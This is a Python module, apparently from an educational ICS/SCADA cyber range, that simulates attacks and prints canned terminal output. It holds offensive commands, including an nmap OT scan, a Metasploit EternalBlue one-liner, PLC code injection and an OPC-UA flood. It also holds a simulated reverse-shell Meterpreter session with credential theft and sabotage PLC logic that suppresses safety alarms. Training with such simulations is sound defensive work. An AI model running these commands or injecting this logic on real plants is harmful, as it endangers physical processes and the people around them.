"""
OT Cyber Range — Attack Engine
Escenarios red-team educativos para entrenamiento en seguridad ICS/SCADA.

DISCLAIMER: Este módulo opera ÚNICAMENTE en un entorno de simulación aislado.
Estas técnicas NO deben usarse jamás contra sistemas industriales reales.

═══════════════════════════════════════════════════════════════════
CÓDIGO PLC LEGÍTIMO — ACCIONES ACEPTABLES
═══════════════════════════════════════════════════════════════════

Un programa PLC seguro para esta planta puede LEER estas variables:
  START, STOP, TEMPERATURE, PRESSURE, MOTOR_SPEED,
  VALVE_POSITION, PRODUCTION_RATE, ALARM

Y puede ESCRIBIR (con rangos seguros):
  MOTOR_SPEED    → rango seguro 500–1450 RPM  (nominal: 1450 RPM)
  VALVE_POSITION → rango seguro 10–90 %        (nominal: 50 %)
  ALARM          → TRUE / FALSE

EJEMPLOS DE CÓDIGO LEGÍTIMO:
─────────────────────────────
  NETWORK 1  (protección térmica)
  IF TEMPERATURE >= 75 THEN
    MOTOR_SPEED := 1200;
  END_IF

  NETWORK 2  (recuperación de velocidad)
  IF TEMPERATURE < 65 THEN
    MOTOR_SPEED := 1450;
  END_IF

  NETWORK 3  (alivio de presión)
  IF PRESSURE > 4.2 THEN
    VALVE_POSITION := 70;
  END_IF

  NETWORK 4  (cierre parcial por presión baja)
  IF PRESSURE < 3.2 THEN
    VALVE_POSITION := 35;
  END_IF

  NETWORK 5  (alarma por temperatura crítica)
  IF TEMPERATURE >= 78 THEN
    ALARM := TRUE;
  END_IF

  NETWORK 6  (reset de alarma al normalizarse)
  IF TEMPERATURE < 75 THEN
    ALARM := FALSE;
  END_IF

═══════════════════════════════════════════════════════════════════
CÓDIGO PLC MALICIOSO — LO QUE LOS ATAQUES INYECTAN
═══════════════════════════════════════════════════════════════════

  NETWORK 1  (paro de emergencia — mata la producción)
  IF START THEN
    MOTOR_SPEED := 0;
  END_IF

  NETWORK 2  (válvula totalmente abierta — pérdida de proceso)
  IF START THEN
    VALVE_POSITION := 100;
  END_IF

  NETWORK 3  (¡LO MÁS PELIGROSO! — suprime alarmas de seguridad)
  IF ALARM THEN
    ALARM := FALSE;
  END_IF

Los ataques avanzados también escriben directamente registros
(temperatura, presión) bypasseando el validador del PLC.
═══════════════════════════════════════════════════════════════════
"""

from __future__ import annotations
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from simulation.plant import Plant


# ---------------------------------------------------------------------------
# Catálogo de escenarios de ataque
# ---------------------------------------------------------------------------

SCENARIOS: dict[str, dict] = {
    "port_scan": {
        "id": "port_scan",
        "name": "Network Reconnaissance",
        "tool": "nmap 7.94",
        "command": "nmap -sS -sV -O -p 102,502,44818,1883,4840,2222 172.16.100.0/24 --open",
        "severity": "MEDIUM",
        "color": "#f59e0b",
        "description": (
            "Escaneo pasivo de la red OT. Identifica activos y puertos de "
            "protocolos industriales abiertos: S7comm (102), Modbus (502), "
            "EtherNet/IP (44818), OPC-UA (4840). Sin payload — solo reconocimiento."
        ),
        "mitre_technique": "T0846 — Remote System Discovery",
        "plant_impact": "NONE",
    },
    "s7_enum": {
        "id": "s7_enum",
        "name": "S7comm PLC Enumeration",
        "tool": "s7-info.py",
        "command": "python3 s7-info.py --target 172.16.100.10 --port 102 --dump-db",
        "severity": "HIGH",
        "color": "#f97316",
        "description": (
            "Conecta al Siemens S7-1500 via S7comm (ISO-on-TCP) y lee "
            "información de CPU, versión de firmware y registros de proceso. "
            "Sin autenticación requerida — configuración incorrecta común."
        ),
        "mitre_technique": "T0861 — Point & Tag Identification",
        "plant_impact": "SIEM_ALERT",
    },
    "plc_inject": {
        "id": "plc_inject",
        "name": "Malicious PLC Code Injection",
        "tool": "s7-inject.py",
        "command": "python3 s7-inject.py --target 172.16.100.10 --payload sabotage_v2.awl --force --bypass-auth",
        "severity": "CRITICAL",
        "color": "#ef4444",
        "description": (
            "Explota la ausencia de protección de acceso al PLC para descargar "
            "lógica de escalera maliciosa. El motor se fuerza a 0 RPM, la válvula "
            "se abre al 100% y los enclavamientos de seguridad quedan deshabilitados."
        ),
        "mitre_technique": "T0836 — Modify Parameter",
        "plant_impact": "MOTOR_STOP + VALVE_OPEN + SAFETY_DISABLED",
    },
    "hmi_exploit": {
        "id": "hmi_exploit",
        "name": "HMI Compromise (EternalBlue)",
        "tool": "Metasploit Framework 6.3",
        "command": (
            'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; '
            'set RHOSTS 172.16.102.10; run"'
        ),
        "severity": "CRITICAL",
        "color": "#ef4444",
        "description": (
            "Explota CVE-2017-0144 (EternalBlue/MS17-010) en la workstation HMI "
            "con Windows. Obtiene acceso SYSTEM y extrae credenciales WinCC SCADA. "
            "Los operadores no pueden confiar en lo que ven en pantalla."
        ),
        "mitre_technique": "T0866 — Exploitation of Remote Services",
        "plant_impact": "HMI_COMPROMISED + CREDENTIAL_THEFT",
    },
    "scada_dos": {
        "id": "scada_dos",
        "name": "SCADA OPC-UA Denial of Service",
        "tool": "opcua-flood.py",
        "command": (
            "python3 opcua-flood.py --target 172.16.104.10 "
            "--port 4840 --rate 10000 --duration 30"
        ),
        "severity": "CRITICAL",
        "color": "#ef4444",
        "description": (
            "Inunda el endpoint OPC-UA del servidor SCADA con 10,000 peticiones "
            "malformadas por segundo. Agota los recursos del servidor y deja "
            "el control supervisorio OFFLINE. Los operadores pierden visibilidad del proceso."
        ),
        "mitre_technique": "T0814 — Denial of Control",
        "plant_impact": "SCADA_OFFLINE + SUPERVISION_LOST",
    },
    "full_sabotage": {
        "id": "full_sabotage",
        "name": "Full Plant Sabotage",
        "tool": "ot-sabotage.py",
        "command": (
            "python3 ot-sabotage.py --target 172.16.100.0/24 "
            "--mode destructive --all-vectors"
        ),
        "severity": "CRITICAL",
        "color": "#7c3aed",
        "description": (
            "Ataque coordinado multi-vector simultáneo: inyección de código PLC, "
            "escritura directa de registros para forzar T=95°C y P=6.2 bar, "
            "explotación de HMI y DoS del SCADA. TODOS los sistemas de seguridad quedan offline."
        ),
        "mitre_technique": "T0879 — Damage to Property",
        "plant_impact": "ALL_SYSTEMS_COMPROMISED + CRITICAL_PROCESS_STATE",
    },
}


class AttackEngine:
    """
    Genera salida de terminal realista para cada escenario de ataque.
    Los efectos físicos reales los aplican los métodos de Plant.
    Esta clase solo produce el texto que el frontend muestra en la consola Kali.
    """

    def __init__(self, plant: "Plant"):
        self.plant = plant

    @staticmethod
    def get_scenarios() -> dict:
        return SCENARIOS

    def terminal_output(self, attack_type: str) -> str:
        """Devuelve la salida de terminal para el tipo de ataque dado."""
        p = self.plant.process
        prog = self.plant.plc_program

        generators = {
            "port_scan":     self._out_port_scan,
            "s7_enum":       lambda: self._out_s7_enum(p, prog),
            "plc_inject":    self._out_plc_inject,
            "hmi_exploit":   self._out_hmi_exploit,
            "scada_dos":     self._out_scada_dos,
            "full_sabotage": lambda: self._out_full_sabotage(p),
        }

        fn = generators.get(attack_type)
        if not fn:
            return f"[ERROR] Unknown attack type: {attack_type}\n"
        return fn()

    # ------------------------------------------------------------------
    # Generadores de salida de terminal
    # ------------------------------------------------------------------

    @staticmethod
    def _out_port_scan() -> str:
        return (
            "Starting Nmap 7.94 ( https://nmap.org )\n"
            "Initiating SYN Stealth Scan at 22:14...\n"
            "\n"
            "Nmap scan report for PLC-001 (172.16.100.10)\n"
            "Host is up (0.0012s latency).\n"
            "PORT      STATE  SERVICE    VERSION\n"
            "102/tcp   open   iso-tsap   Siemens S7comm (S7-1500 v2.9)\n"
            "4840/tcp  open   opc-ua     OPC Unified Architecture\n"
            "22222/tcp open   ssh        Dropbear sshd 2020.81\n"
            "\n"
            "Nmap scan report for HMI-001 (172.16.102.10)\n"
            "Host is up (0.0021s latency).\n"
            "PORT     STATE  SERVICE       VERSION\n"
            "80/tcp   open   http          Microsoft IIS httpd 10.0\n"
            "135/tcp  open   msrpc         Microsoft Windows RPC\n"
            "445/tcp  open   microsoft-ds  Windows 10 Enterprise LTSC (SMBv1!)\n"
            "5900/tcp open   vnc           RealVNC 6.7 (NO AUTH)\n"
            "\n"
            "Nmap scan report for SCADA-001 (172.16.104.10)\n"
            "Host is up (0.0019s latency).\n"
            "PORT     STATE  SERVICE    VERSION\n"
            "4840/tcp open   opc-ua     OPC UA Binary (anon access enabled)\n"
            "5432/tcp open   postgresql PostgreSQL DB 14.2\n"
            "\n"
            "Nmap scan report for GW-001 (172.16.103.10)\n"
            "Host is up (0.0033s latency).\n"
            "PORT    STATE  SERVICE   VERSION\n"
            "443/tcp open   ssl/http  eWON Cosy+ VPN portal\n"
            "\n"
            "Nmap done: 256 IP addresses (4 hosts up) scanned in 8.41 seconds\n"
            "\n"
            "[!] FINDINGS CRÍTICOS:\n"
            "    ► S7comm en PLC SIN protección de acceso configurada\n"
            "    ► HMI ejecuta Windows 10 sin parches (SMBv1 activo)\n"
            "    ► VNC en HMI SIN contraseña (puerto 5900)\n"
            "    ► OPC-UA con acceso anónimo habilitado\n"
            "    ► SSH con credenciales por defecto en PLC\n"
        )

    @staticmethod
    def _out_s7_enum(process, program) -> str:
        return (
            "[*] Conectando a 172.16.100.10:102 via S7comm...\n"
            "[+] Conexión establecida (ISO-on-TCP RFC 1006)\n"
            "[+] Información CPU S7:\n"
            "    Tipo de módulo : 6ES7 515-2AM01-0AB0\n"
            "    Hardware       : V2.0\n"
            "    Software       : V2.9.0\n"
            "    Nombre AS      : PLC_PROD_LINE01\n"
            "    Nombre módulo  : Siemens S7-1500\n"
            f"    Estado CPU     : RUN\n"
            f"    Programa       : MAIN v{program.version}\n"
            "\n"
            "[*] Leyendo bloque de datos de proceso (DB1)...\n"
            f"[+] DB1.DBD0  TEMPERATURA   = {process.temperature:.1f} °C\n"
            f"[+] DB1.DBD4  PRESION       = {process.pressure:.2f} bar\n"
            f"[+] DB1.DBD8  VEL_MOTOR     = {process.motor_speed:.0f} RPM\n"
            f"[+] DB1.DBD12 POS_VALVULA   = {process.valve_position:.0f} %\n"
            f"[+] DB1.DBD16 TASA_PROD     = {process.production_rate:.1f} %\n"
            "\n"
            "[!] Autenticación: NINGUNA — sin protección de acceso\n"
            "[!] Datos de proceso exfiltrados exitosamente\n"
            "[*] Sesión S7comm cerrada\n"
        )

    @staticmethod
    def _out_plc_inject() -> str:
        return (
            "[*] Conectando a 172.16.100.10:102 via S7comm...\n"
            "[+] Conexión establecida\n"
            "[*] Cambiando CPU a modo STOP para descarga de programa...\n"
            "[+] Estado CPU: RUN -> STOP\n"
            "[*] Subiendo bloque OB1 malicioso (sabotage_v2.awl)...\n"
            "    Tamaño bloque : 1,284 bytes\n"
            "    Tipo          : OB (Bloque de Organización)\n"
            "    [####################] 100% — cargado\n"
            "[+] Bloque OB1 escrito en memoria PLC\n"
            "[*] Restaurando CPU a modo RUN...\n"
            "[+] Estado CPU: STOP -> RUN\n"
            "\n"
            "[!] LÓGICA DE SABOTAJE ACTIVA:\n"
            "    NETWORK 1: IF START THEN MOTOR_SPEED := 0        ← PARO\n"
            "    NETWORK 2: IF START THEN VALVE_POSITION := 100   ← VÁLVULA ABIERTA\n"
            "    NETWORK 3: IF ALARM THEN ALARM := FALSE          ← SUPRIME ALARMAS\n"
            "\n"
            "[!] Motor parado de emergencia → 0 RPM\n"
            "[!] Válvula forzada a 100% → pérdida de fluido de proceso\n"
            "[!] Enclavamientos de seguridad DESHABILITADOS\n"
            "[!] Los operadores NO ven alarmas — el ataque está OCULTO\n"
            "[*] Payload se auto-oculta en 10s — saliendo\n"
        )

    @staticmethod
    def _out_hmi_exploit() -> str:
        return (
            "[*] Iniciando handler TCP reverso en 192.168.1.100:4444\n"
            "[*] 172.16.102.10:445 — Iniciando conexión...\n"
            "[+] 172.16.102.10:445 — SO: Windows 10 Enterprise LTSC 2019\n"
            "[+] 172.16.102.10:445 — Host VULNERABLE a MS17-010!\n"
            "[*] Enviando exploit EternalBlue...\n"
            "[*] Enviando stage (200,774 bytes) a 172.16.102.10\n"
            "[+] Sesión Meterpreter 1 abierta (192.168.1.100:4444 -> 172.16.102.10)\n"
            "\n"
            "meterpreter > getuid\n"
            "Server username: NT AUTHORITY\\SYSTEM\n"
            "\n"
            "meterpreter > run post/windows/gather/credentials/siemens_wincc\n"
            "[+] Credenciales WinCC encontradas:\n"
            "    Usuario  : scada_operator\n"
            "    Password : Siemens2024!\n"
            "    Host     : 172.16.104.10 (servidor SCADA)\n"
            "\n"
            "meterpreter > screenshot\n"
            "[+] Captura guardada — HMI mostrando proceso de producción\n"
            "\n"
            "[!] HMI OPERADOR COMPROMETIDA — acceso SYSTEM obtenido\n"
            "[!] Atacante puede manipular pantallas HMI y vista del operador\n"
            "[!] Operadores no pueden confiar en la información que ven\n"
        )

    @staticmethod
    def _out_scada_dos() -> str:
        return (
            "[*] Ataque DoS OPC-UA contra 172.16.104.10:4840\n"
            "[*] Enviando 10,000 peticiones CreateSession malformadas/seg...\n"
            "\n"
            "    [00:01]  10,000 req enviadas | Respuesta: 240 ms\n"
            "    [00:02]  20,000 req enviadas | Respuesta: 890 ms\n"
            "    [00:03]  30,000 req enviadas | Respuesta: 3,400 ms\n"
            "    [00:04]  40,000 req enviadas | Respuesta: TIMEOUT\n"
            "    [00:05]  50,000 req enviadas | Respuesta: CONEXIÓN RECHAZADA\n"
            "\n"
            "[+] Servicio OPC-UA NO RESPONDE\n"
            "[!] Control supervisorio SCADA OFFLINE\n"
            "[!] Operadores han PERDIDO visibilidad del proceso\n"
            "[!] Sin control remoto — solo operación desde campo\n"
        )

    @staticmethod
    def _out_full_sabotage(process) -> str:
        return (
            "[*] OT-SABOTAGE v2.1 — Educational Cyber Range Tool\n"
            "[*] Red objetivo: 172.16.100.0/24\n"
            "[*] Modo: DESTRUCTIVO — todos los vectores simultáneos\n"
            "[*] ════════════════════════════════════════\n"
            "\n"
            "[*] VECTOR 1 — Inyección de Código PLC (S7comm)\n"
            "[+] OB1 malicioso inyectado en 172.16.100.10\n"
            "[!] Motor: 1450 RPM → 0 RPM         (PARO DE EMERGENCIA)\n"
            "[!] Válvula: 50% → 100%              (TOTALMENTE ABIERTA)\n"
            "[!] Alarmas de seguridad: SUPRIMIDAS (operadores ciegos)\n"
            "\n"
            "[*] VECTOR 2 — Sobrescritura Directa de Registros\n"
            "[+] Bypaseando enclavamientos de seguridad del PLC...\n"
            f"[!] Temperatura: {process.temperature:.1f}°C → 95.0°C  "
            "(CRÍTICO — cerca del punto de ebullición)\n"
            f"[!] Presión:     {process.pressure:.2f} bar → 6.2 bar "
            "(CRÍTICO — límite del recipiente)\n"
            "\n"
            "[*] VECTOR 3 — Movimiento Lateral\n"
            "[+] HMI    172.16.102.10 — EternalBlue PWNED (SYSTEM)\n"
            "[+] SCADA  172.16.104.10 — OPC-UA INUNDADO (OFFLINE)\n"
            "[+] GW     172.16.103.10 — Credenciales VPN exfiltradas\n"
            "[+] ENG    172.16.105.10 — TIA Portal backdoor instalado\n"
            "\n"
            "[*] ════════════════════════════════════════\n"
            "[!] TODOS LOS ACTIVOS OT COMPROMETIDOS\n"
            "[!] Sistemas de seguridad OFFLINE — operadores CIEGOS\n"
            "[!] Proceso en estado CRÍTICO — daño físico INMINENTE\n"
        )